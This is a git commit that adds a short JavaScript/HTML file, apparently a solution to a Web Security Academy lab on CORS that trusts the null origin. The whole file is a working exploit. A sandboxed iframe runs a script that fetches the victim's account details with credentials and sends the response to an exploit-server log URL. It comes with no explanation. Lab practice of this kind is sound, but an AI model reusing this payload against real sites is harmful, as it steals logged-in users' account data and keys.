80f28a7611de415dc7738daf9095dce6e86436dd
Rishad <62689470+rishadpt@users.noreply.github.com>
2021-10-19 11:13:06 -0700

    Create cors null.js

---
+++ cors null.js
@@ -0,0 +1,11 @@
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+   var req = new XMLHttpRequest ();
+   req.onload = reqListener;
+   req.open('get','ac661f041e7cac24c0cb2fb700bb0081.web-security-academy.net/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='$exploit-acfb1f281e9eac46c0ed2f48013400eb.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
+   };
+</script>"></iframe>
